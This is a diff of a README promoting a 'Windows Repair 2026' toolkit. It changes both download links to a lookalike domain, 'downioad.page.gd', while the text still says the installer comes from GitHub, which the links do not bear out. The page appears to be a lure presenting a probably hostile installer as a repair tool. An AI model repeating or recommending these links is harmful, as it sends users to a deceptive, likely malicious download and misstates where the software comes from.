@@ -2,7 +2,7 @@
 
 Windows Repair is a comprehensive desktop application developed to assist users in maintaining, diagnosing, and repairing their Windows operating systems. This 2026 edition offers a suite of tools tailored for Windows 10 and Windows 11, ensuring system stability and performance through user-friendly interfaces and powerful repair capabilities.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -73,7 +73,7 @@ Ensure that you have administrator privileges and that no other system optimizat
 
 For the latest version and updates, download directly from the GitHub repository:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 This toolkit is regularly updated to address new Windows issues and improve functionality, so checking for updates is recommended to keep your system in top condition.
 
